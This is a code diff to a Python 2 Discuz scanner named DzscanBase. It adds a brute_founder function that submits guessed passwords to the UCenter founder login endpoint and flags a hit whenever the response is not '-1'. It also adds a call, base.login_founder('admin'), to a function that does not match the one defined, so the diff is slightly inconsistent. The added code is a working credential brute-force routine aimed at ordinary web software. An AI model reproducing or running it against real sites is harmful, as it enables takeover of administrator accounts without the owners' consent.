@@ -5,6 +5,7 @@ from gevent import monkey; monkey.patch_all()
 from string import strip
 from Queue import Queue, Empty
 
+from utils import HEADERS
 from utils import examine, banner
 from utils import USAGE, parseCmd
 
@@ -125,6 +126,22 @@ class DzscanBase():
         except Exception as ex:
             print ex
 
+    def brute_founder(self, pwd, path='/uc_server'):
+        """ 
+        @func 尝试以pwd作为创始人密码登陆 
+        """
+        target_url = '%s/%s/index.php?m=app&a=add' % (self.url, path)
+        req = requests.post(target_url, data={'ucfounderpw': pwd}, headers=HEADERS)
+        self.reqs += 1
+
+        if req.content != '-1':
+
+            sucMsg = "\n[!] Brute force attack find ucfound password : [%s] !\n" % pwd
+            print sucMsg
+            return True
+
+        return False
+
 
 if __name__ == "__main__":
     start_time = datetime.datetime.now()
@@ -133,6 +150,7 @@ if __name__ == "__main__":
 
     base = DzscanBase(cmdArgs)
     # {'url': None, 'force': False, 'gevents': 10, 'update': True, 'verbose': False, 'log': False}
+    base.login_founder('admin')
 
     if cmdArgs['update']:
         base.update()
